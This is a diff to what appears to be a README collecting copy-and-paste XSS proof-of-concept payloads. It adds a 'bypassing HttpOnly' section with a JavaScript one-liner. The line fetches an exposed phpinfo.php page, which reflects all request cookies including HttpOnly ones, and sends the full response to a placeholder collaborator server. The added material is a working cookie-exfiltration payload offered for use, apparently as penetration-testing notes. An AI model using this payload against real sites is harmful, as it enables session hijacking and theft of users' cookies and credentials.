@@ -3,7 +3,8 @@
 Originally this started as just a little list of PoC payloads but it has now expanded to some more general notes as well. This now contains easy copy & paste PoC payloads as well as quick references for what HTML tags frequent event attributes use. 
 
 ### **Quick-navigation:**
-+ **EXFILTRATION:**  
++ **EXFILTRATION:**
+  + [PHPINFO + HTTPONLY WOMBO COMBO](#bypassing-httponly)
   + [FETCH](#fetch)  
   + [.$GET](#jquery-ajax)
 + **FORCING ACTIONS:**
@@ -27,6 +28,11 @@ Originally this started as just a little list of PoC payloads but it has now exp
 
 # 👁️‍🗨️ EXFILTRATION
 *For session hijacking, sensitive info exfil, etc.*
+## BYPASSING HTTPONLY
+**NOTE**: *This is a fairly niche attack path, but demonstrates how cookie reflection isn't very secure.* If `phpinfo.php` is exposed it will read all the cookies from the request header **including cookies set to HttpOnly**. Because of this, if you make a GET request to `phpinfo.php` the response will contain all the cookies, you can then do whatver you want with it. In this case I just send the whole response out as a GET.
+```javascript
+fetch('/phpinfo.php').then(response => response.text()).then(data => fetch("{your_collab_server}/?response="+(encodeURIComponent(data))));
+```
 ## FETCH
 ### GET VALUE FROM LOCAL STORAGE AND $FETCH:
 ```javascript
